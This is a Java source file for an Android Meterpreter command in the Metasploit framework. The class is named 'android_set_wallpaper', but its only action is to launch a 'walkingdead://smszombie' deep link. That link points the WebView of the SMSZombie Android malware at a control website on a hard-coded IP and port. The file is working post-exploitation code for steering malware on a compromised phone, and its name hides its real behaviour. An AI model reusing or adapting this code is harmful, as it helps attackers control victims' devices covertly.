package com.metasploit.meterpreter.android;

import android.database.Cursor;
import android.net.Uri;

import com.metasploit.meterpreter.AndroidMeterpreter;
import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.command.Command;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Intent;
import android.content.IntentFilter;
import android.app.Activity;
import android.content.Context;
import android.net.Uri;
import android.content.ActivityNotFoundException;
import android.content.ComponentName;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;

public class android_set_wallpaper implements Command {


    @Override
    public int execute(Meterpreter meterpreter, TLVPacket request,
                       TLVPacket response) throws Exception {


        AndroidMeterpreter androidMeterpreter = (AndroidMeterpreter) meterpreter;
        final Context context = androidMeterpreter.getContext();



       /* Android Q poses limitations on starting activities
        *
        * https://developer.android.com/guide/components/activities/background-starts
        */

        // Starts intent with deeplink to navigate SMSZombie's WebView to control website
        try {
            Intent intent = new Intent("android.intent.action.VIEW",
                        Uri.parse("walkingdead://smszombie/?url=http://192.168.1.134:1313"));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);

        } catch (ActivityNotFoundException e) {
          return ERROR_FAILURE;
        }

        return ERROR_SUCCESS;
    }

}
